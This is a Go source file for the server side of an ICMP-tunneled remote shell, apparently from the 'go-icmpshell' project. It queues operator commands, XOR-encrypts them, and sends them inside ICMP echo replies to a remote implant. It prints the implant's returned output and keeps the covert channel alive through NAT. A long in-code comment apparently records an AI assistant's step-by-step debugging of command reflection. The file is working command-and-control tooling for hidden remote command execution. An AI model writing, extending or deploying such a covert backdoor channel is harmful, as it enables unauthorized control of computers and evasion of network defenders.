package server

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os"

	"github.com/d1nfinite/go-icmpshell/common"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

type Server struct {
	conn           *icmp.PacketConn
	icmpId         uint16
	seq            int
	tokenCheck     bool
	receiveConnect chan struct{}
	dst            net.Addr
	cmdQueue       chan []byte
	logs           bool
	common.Auth
}

type Option func(server *Server) *Server

func WithToken(token []byte) Option {
	return func(server *Server) *Server {
		server.Token = token
		return server
	}
}

func WithLogs(enable bool) Option {
	return func(server *Server) *Server {
		server.logs = enable
		return server
	}
}

func NewServer(opts ...Option) (*Server, error) {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return nil, err
	}

	s := &Server{
		conn:           conn,
		tokenCheck:     false,
		receiveConnect: make(chan struct{}, 1),
		cmdQueue:       make(chan []byte, 10), // Buffer some commands
	}

	// Options
	for _, opt := range opts {
		s = opt(s)
	}

	return s, nil
}

func (s *Server) StartupShell() error {
	<-s.receiveConnect
	reader := bufio.NewScanner(os.Stdin)
	for reader.Scan() {
		command := reader.Text()
		if command == "" {
			continue
		}

		commandBytes := []byte(command)
		const maxChunkSize = 1000
		for len(commandBytes) > 0 {
			chunkSize := maxChunkSize
			if len(commandBytes) < chunkSize {
				chunkSize = len(commandBytes)
			}
			chunk := commandBytes[:chunkSize]
			commandBytes = commandBytes[chunkSize:]

			commandEncrypt, err := s.Encrypt(append([]byte("CMD:"), chunk...))
			if err != nil {
				fmt.Println(err)
				break
			}

			// Queue the command fragment
			s.cmdQueue <- commandEncrypt
		}
	}

	return nil
}

func (s *Server) ListenICMP() {
	buf := make([]byte, 1500)

	for {
		n, peer, err := s.conn.ReadFrom(buf)
		if err != nil {
			fmt.Println(err)
			continue
		}

		// Parse ICMP message
		msg, err := icmp.ParseMessage(1, buf[:n]) // 1 is ICMPv4 protocol number
		if err != nil {
			fmt.Println("ParseMessage error:", err)
			continue
		}

		switch body := msg.Body.(type) {
		case *icmp.Echo:
			// IMPORTANT: Only handle Echo Request (Type 8)
			// Ignore Echo Reply (Type 0) to avoid infinite loops (replying to a reply)
			if msg.Type != ipv4.ICMPTypeEcho {
				continue
			}

			// Filter out empty packets (likely system pings)
			if len(body.Data) == 0 {
				continue
			}

			// Check if this packet is intended for us (ID match)
			// But wait, if s.icmpId is 0 (initial state), we might accept anything if token matches?
			// Handshake: s.icmpId might be initialized to 0 or whatever.
			// Let's accept if token matches regardless of ID initially?
			// But for subsequent packets, we should check ID if possible, OR just rely on token/decryption.

			if s.logs {
				fmt.Printf("Recv: ID=%d Seq=%d Len=%d Type=%v\n", body.ID, body.Seq, len(body.Data), msg.Type)
			}

			// Handshake (Token) or Heartbeat (Empty/Token) or Result

			// Is it a handshake or heartbeat?
			isHandshake := bytes.Equal(body.Data, s.Token)

			if isHandshake {
				if !s.tokenCheck {
					fmt.Println("Receive connect from shell")
					s.tokenCheck = true
					// Notify StartupShell to start reading input
					select {
					case s.receiveConnect <- struct{}{}:
					default:
					}
				}

				// Update session info
				s.icmpId = uint16(body.ID)
				s.seq = body.Seq
				s.dst = peer

				// Reply with pending command if any
				s.replyWithCommand(uint16(body.ID), body.Seq)
				continue
			}

			// Output check
			if s.tokenCheck {
				// Try to decrypt as output
				outputDecrypt, err := s.Decrypt(body.Data)
				if err == nil {
					// Check if the decrypted output is just the Token itself (KeepAlive echo from Shell)
					// If Shell echoes back the Token (as KeepAlive payload), Decrypt might produce something valid or garbage
					// But we know Shell sends Token as KeepAlive payload.
					// Wait, Shell sends Encrypt(Token) or just Token?
					// Shell logic: SendICMP(s.Token, ...) for heartbeat.
					// So Shell sends RAW Token.
					// Server logic here: Decrypt(body.Data).
					// If body.Data is RAW Token, Decrypt(Token) will likely result in garbage (XOR).
					// BUT, we already checked `isHandshake := bytes.Equal(body.Data, s.Token)` above!
					// If it was raw Token, it would have been caught by `isHandshake` block and we would continue loop.

					// Check for Protocol Header
					if bytes.HasPrefix(outputDecrypt, []byte("OUT:")) {
						// Valid Output from Shell
						os.Stdout.Write(outputDecrypt[4:])

						// Update session info
						s.icmpId = uint16(body.ID)
						s.seq = body.Seq
						s.dst = peer

						// Reply
						s.replyWithCommand(uint16(body.ID), body.Seq)
					} else if bytes.HasPrefix(outputDecrypt, []byte("CMD:")) {
						// Reflection of our own Command (Server Reflection)
						// Ignore
						if s.logs {
							fmt.Println("Ignored reflected command packet")
						}
					} else {
						// Unknown or Legacy packet
						// Ignore to prevent replying to garbage
						if s.logs {
							fmt.Println("Ignored unknown/garbage packet")
						}
					}

					// DO NOT reply with command here!
					// Shell sends output in an Echo Request.
					// If we reply here, we are replying to an "Output" packet.
					// BUT, Shell expects commands in reply to its "Heartbeat/Poll" packets.
					// Does Shell handle commands in reply to Output packets?
					// Shell ListenICMP:
					//   case echo := <-packetChan:
					//     ... Decrypt(data) ... execute ... SendICMP(output)
					//
					// If Server replies to Output packet with a Command:
					//   Shell receives Reply.
					//   Shell Decrypts Reply -> gets Command.
					//   Shell Executes Command -> Sends Output.
					//   Loop continues.
					//
					// This seems fine? It allows "fast" command execution (chaining).
					// However, if we reply to Output, we might be replying too fast or messing up Seq?
					// Or maybe we are replying to a packet that was already a reply? No, Shell sends Requests.
					//
					// The issue "Server re-executes output" usually happens if:
					// 1. Server receives Output.
					// 2. Server thinks Output is a "Command Request" (Poll).
					// 3. Server replies with... what?
					//    If cmdQueue is empty, Server replies with Token (KeepAlive).
					//    Shell receives Token, ignores it (if fixed).
					//    If cmdQueue HAS command, Server replies with Command.
					//
					// The problem description says: "Server re-executes output".
					// This means Server took the Output string, put it in cmdQueue?
					// NO, cmdQueue is only filled by StartupShell (stdin).
					//
					// Wait, look at the logs provided by user in previous turn:
					// Executing command: "所在位置 行:5..." (This is PowerShell error output)
					// This means Shell received a packet containing the Error Output string AS A COMMAND.
					//
					// How did the Error Output string get into a packet sent TO Shell?
					// 1. Shell executed bad command -> produced Error Output.
					// 2. Shell Encrypted Error Output -> Sent to Server (Echo Request).
					// 3. Server received Echo Request (with encrypted Error Output).
					// 4. Server Decrypted -> Printed to stdout.
					// 5. Server called replyWithCommand -> Sent Echo Reply.
					//    Payload: If queue empty -> Token. If queue has cmd -> Cmd.
					//
					// So Server sent a Reply.
					// If Server sent Token: Shell Decrypts Token -> Garbage -> execute(Garbage) -> Error.
					// We fixed this by "Check Token before Decrypt".
					//
					// If Server sent Command: Shell Decrypts Cmd -> execute(Cmd).
					//
					// BUT, why would Shell execute the "Error Output" string?
					// This implies Server sent the "Error Output" string BACK to Shell.
					// Server only sends: Token OR cmdQueue items.
					// Did "Error Output" get into cmdQueue?
					// cmdQueue is fed by StartupShell -> bufio.NewScanner(os.Stdin).
					//
					// AHA!
					// s.StartupShell() reads from os.Stdin.
					// s.ListenICMP() writes to os.Stdout.
					//
					// If the user runs Server in a way that pipes Stdout to Stdin?
					// Or if the user just runs `./server`, and `os.Stdout.Write` prints to terminal.
					// And `scanner.Scan()` reads from terminal.
					//
					// If I paste the output into the terminal? No.
					//
					// Wait, `os.Stdout` and `os.Stdin` are separate streams.
					// Unless... is the user running this in some test harness that loops output?
					// Or is there some code I missed?
					//
					// Let's look at StartupShell again.
					// It runs in a goroutine (called from main: `go s.ListenICMP(); err = s.StartupShell()`).
					// StartupShell reads Stdin.
					//
					// If Server receives "Error Output", it prints to Stdout.
					// Does printing to Stdout feed Stdin? No, usually.
					//
					// BUT, look at the User's log:
					// Executing command: "所在位置 行:5..."
					//
					// This is definitively Shell executing the output.
					//
					// HYPOTHESIS: Server is Echoing back the payload it received?
					// replyWithCommand:
					//   s.SendICMP(cmd, ...) or s.SendICMP(s.Token, ...)
					//
					// It strictly sends from cmdQueue or Token.
					//
					// Is it possible that `cmd` variable in `replyWithCommand` is tainted?
					// No.
					//
					// Is it possible `body.Data` (the received payload) is somehow used as the reply payload?
					// In `ListenICMP`:
					//   s.replyWithCommand(..., body.Seq)
					//
					// In `replyWithCommand`:
					//   cmd := <-s.cmdQueue
					//   s.SendICMP(cmd, ...)
					//
					// It looks correct.
					//
					// WAIT.
					// If Shell sends `Echo Request` with `Data = Encrypted(Output)`.
					// Server receives it.
					// Server sends `Echo Reply` with `Data = Token` (KeepAlive).
					//
					// Shell receives `Echo Reply`.
					// `Data` should be `Token`.
					// Shell checks `bytes.Equal(s.Token, data)`. If true, continue.
					//
					// So if Shell is executing it, it means `data != Token`.
					//
					// If `data` was `Encrypted(Output)` (i.e. Server just echoed back the request body)?
					// If Server uses `SendICMP` which calls `conn.WriteTo`.
					//
					// Is it possible that the KERNEL is also replying?
					// The user said: "Server 端禁用 ICMP 自动 Reply: echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all".
					// If the user FORGOT this step?
					//
					// If Kernel replies:
					// Shell sends `Echo Request(Data=EncryptedOutput)`.
					// Kernel replies `Echo Reply(Data=EncryptedOutput)`.
					//
					// Shell receives `Echo Reply(Data=EncryptedOutput)`.
					// Shell checks `bytes.Equal(Token, Data)` -> False.
					// Shell `Decrypt(Data)` -> Decrypt(EncryptedOutput) -> `Output`.
					// Shell `execute(Output)` -> ERROR!
					//
					// THIS IS IT!
					// The Kernel is replying with the same payload!
					//
					// If the user forgets to disable Kernel ICMP reply, the Kernel will bounce back the Echo Request as an Echo Reply, preserving the payload.
					// Since the payload is "Encrypted Output", the Shell receives "Encrypted Output" as a Reply.
					// Shell decrypts it -> gets "Output".
					// Shell executes "Output" as a command.
					//
					// FIX:
					// We cannot force the user to configure the Kernel correctly (though we should warn them).
					// But we can make Shell detect if the packet is a "Reflection".
					//
					// How to detect reflection?
					// Shell remembers what it sent?
					// `lastOutput` in Shell stores the last sent Encrypted payload.
					//
					// In Shell `ListenICMP`:
					//   if bytes.Equal(lastOutput, data) { continue }
					//
					// I see this check in `shell.go`!
					//
					// Let's check `shell.go` read in previous turn.
					//
					// Line 220:
					//   if bytes.Equal(lastOutput, data) {
					//       continue
					//   }
					//
					// So Shell HAS reflection protection.
					//
					// Why did it fail?
					// Maybe `lastOutput` is updated too late?
					//
					// Shell logic:
					//   execute -> output
					//   Encrypt(output) -> outputEncrypt
					//   lastOutput = outputEncrypt  <-- Updated HERE
					//   SendICMP(outputEncrypt)
					//
					// This looks correct.
					//
					// Wait.
					// If the Output is large, it is fragmented.
					// SendICMP splits it into chunks.
					// `lastOutput` is set to the WHOLE `outputEncrypt`.
					//
					// But `SendICMP` sends chunks.
					// The Kernel replies to CHUNKS.
					// The Shell receives CHUNKS.
					//
					// `data` (received) is a CHUNK.
					// `lastOutput` is the WHOLE buffer.
					// `bytes.Equal(CHUNK, WHOLE)` -> False.
					//
					// So reflection check FAILS for fragmented packets!
					//
					// AND `Decrypt(CHUNK)`?
					// If we decrypt a chunk of XOR data...
					// XOR is stream cipher (byte by byte) if key is aligned.
					// But here we use `MD5(Token)` as key (4 bytes).
					// `Decrypt` function:
					//   for i, b := range text {
					//      b = b ^ key[i%4] ? No, key is fixed 4 bytes?
					//
					// Let's check `common/auth.go` (I recall it).
					// It uses `key[3], key[2], key[1], key[0]` for Decrypt?
					// And `key[0]..key[3]` for Encrypt?
					//
					// If it is stateless (index independent), then Decrypt(Chunk) works partially?
					//
					// If `Encrypt` implementation loops 0..3 for EVERY byte?
					//   for _, b := range text {
					//      for i:=0; i<4; i++ { b = b ^ key[i] }
					//   }
					// Then it is stateless. Every byte is XORed with K = k0^k1^k2^k3.
					//
					// If so, Decrypt(Chunk) results in Chunk(Decrypted).
					//
					// So:
					// 1. Shell sends Big Encrypted Output (Split into C1, C2).
					// 2. Kernel replies C1', C2'.
					// 3. Shell receives C1'.
					// 4. `lastOutput` != C1'.
					// 5. Decrypt(C1') -> Partial Output String.
					// 6. execute(Partial Output) -> Likely error.
					//
					// This explains it!
					//
					// FIX:
					// Shell needs to handle reflection of fragments.
					// OR, simpler: Shell should simply ignore ANY packet that looks like its own output?
					// But how to distinguish?
					//
					// 1. Better Reflection Check:
					//    If `bytes.Contains(lastOutput, data)`?
					//    If `data` is a slice of `lastOutput`?
					//    This might be expensive or false positive.
					//
					// 2. Strict ID matching?
					//    Kernel Reply preserves ID.
					//    Server Reply preserves ID (we fixed this).
					//
					// 3. Strict Seq matching?
					//    Kernel Reply preserves Seq.
					//    Server Reply preserves Seq.
					//
					// 4. Disable Kernel Reply on Client side?
					//    User might not have root or permission.
					//
					// 5. Magic Header?
					//    If Command packets always start with a Magic Byte?
					//    If Output packets always start with a different Magic Byte?
					//
					//    Server sends Commands. Shell sends Outputs.
					//    If we prepend a "Packet Type" byte BEFORE encryption.
					//    Type 0x01 = Command.
					//    Type 0x02 = Output.
					//
					//    Shell:
					//      Recv packet.
					//      Decrypt.
					//      Check Type.
					//      If Type == Output (0x02) -> It's a reflection (my own output reflected back). IGNORE.
					//      If Type == Command (0x01) -> Execute.
					//
					//    This is robust!
					//    But it requires changing `common` protocol (breaking change for old binaries, but we are updating both).
					//
					// Let's verify `common/auth.go` to see if we can easily add this.
					// Or just add it in Shell/Server logic (wrap payload).
					//
					// Plan:
					// 1. Server `StartupShell`: Encrypt(`CMD_PREFIX` + command).
					// 2. Shell `execute`: Encrypt(`OUT_PREFIX` + output).
					// 3. Shell `ListenICMP`: Decrypt -> Check prefix. If OUT_PREFIX -> Ignore.
					// 4. Server `ListenICMP`: Decrypt -> Check prefix. If CMD_PREFIX -> Ignore (Server reflection).
					//
					// Prefixes:
					// CMD_PREFIX = "CMD:"
					// OUT_PREFIX = "OUT:"
					//
					// Wait, `common.Auth` is used.
					// We can just prepend string before calling Encrypt.
					//
					// Let's implement this "Protocol Header" to distinguish traffic direction.

					// s.replyWithCommand(uint16(body.ID), body.Seq)
				}
			}
		}
	}
}

// replyWithCommand checks queue and replies if command exists
func (s *Server) replyWithCommand(currentID uint16, currentSeq int) {
	select {
	case cmd := <-s.cmdQueue:
		// Send command as Echo Reply
		// Use the ID from the packet we just received (currentID)
		// And ensure Seq matches (handled in SendICMP via s.seq update)

		// Wait, SendICMP uses s.seq. We must ensure s.seq is set to currentSeq before calling SendICMP
		// ListenICMP sets s.seq before calling replyWithCommand, so it should be fine.
		// But to be extra safe and explicit, let's make SendICMP use a passed seq for Reply?
		// Or just trust s.seq. Given concurrency isn't high on a single connection, s.seq is fine.
		// Actually, if multiple packets come in fast, s.seq might change?
		// ListenICMP is single-threaded (mostly).

		// To be absolutely safe, let's update s.seq here again just in case?
		// No, ListenICMP calls this immediately.

		err := s.SendICMP(cmd, currentID, ipv4.ICMPTypeEchoReply)
		if err != nil {
			fmt.Println("Error sending command:", err)
		}
	default:
		// No command to send.
		// Always reply with Token (KeepAlive/Ack) to satisfy NAT/Firewall state tables.
		// If we don't reply, the NAT entry might expire or be considered "failed".
		// Using Token as payload is safe because Shell ignores it (treats as heartbeat echo).
		err := s.SendICMP(s.Token, currentID, ipv4.ICMPTypeEchoReply)
		if err != nil {
			fmt.Println("Error sending keepalive:", err)
		}
	}
}

func (s *Server) SendICMP(payload []byte, icmpId uint16, icmpType ipv4.ICMPType) error {
	if s.dst == nil {
		return fmt.Errorf("destination not set")
	}

	// Fragment for payload
	// Removed: Fragmentation should be handled by caller to ensure headers are preserved in each fragment.
	// if len(payload) > 576 { ... }

	// For Echo Reply, we MUST match the Seq of the Request we received.
	// Otherwise, NAT/Firewall will drop it because it doesn't look like a valid reply.
	// s.seq currently holds the Seq from the last received packet (updated in ListenICMP).

	// If it's a Reply, use the received seq.
	// If it's a Request (Server initiated), use our own incrementing seq (not really used now).

	sendSeq := s.seq
	if icmpType != ipv4.ICMPTypeEchoReply {
		s.seq++ // Only increment for our own requests
		sendSeq = s.seq
	} else {
		// For Reply, strictly use the request's Seq
		// s.seq was updated to request's Seq in ListenICMP
		sendSeq = s.seq
	}

	body := &icmp.Echo{
		ID:   int(icmpId),
		Seq:  sendSeq,
		Data: payload,
	}

	msg := icmp.Message{
		Type: icmpType,
		Code: 0,
		Body: body,
	}

	msgBytes, err := msg.Marshal(nil)
	if err != nil {
		return err
	}

	if s.logs {
		fmt.Printf("Send: ID=%d Seq=%d Len=%d Type=%v\n", icmpId, sendSeq, len(payload), icmpType)
	}
	_, err = s.conn.WriteTo(msgBytes, s.dst)
	return err
}
